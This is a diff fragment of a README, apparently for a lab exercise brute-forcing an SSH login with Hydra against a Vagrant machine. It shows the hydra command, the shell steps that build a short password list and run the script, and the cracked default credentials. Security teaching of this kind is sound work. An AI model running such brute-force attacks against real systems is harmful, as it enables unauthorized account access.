@@ -17,7 +17,7 @@ hydra -l "$USERNAME" -P "$PASSWORD_LIST" ssh://"$TARGET_IP" -t 4 -f -V
 <img src="./screenshots/08_script_created.png" alt="User/Pass file created" width="600"/>
 
 ## Execution Steps
-The script executed successfully. Hydra found the correct SSH login credentials: username: vagrant, password: vagrant. The attack stopped after identifying the valid password.
+First, the command chmod +x ssh_bruteforce.sh made the script executable. Then, echo -e "Shahad\nNorah\n..." > passwords.txt created a password list, saving each name on a new line. Finally, ./ssh_bruteforce.sh executed the script to start the brute-force attack.
 ```bash
 chmod +x ssh_bruteforce.sh
 echo -e "Shahad\nNorah\nNora\nvagrant\nJude\nJouri\nAbood\nHamood\nNoor\nRawan\nAli\nOoody" > passwords.txt 
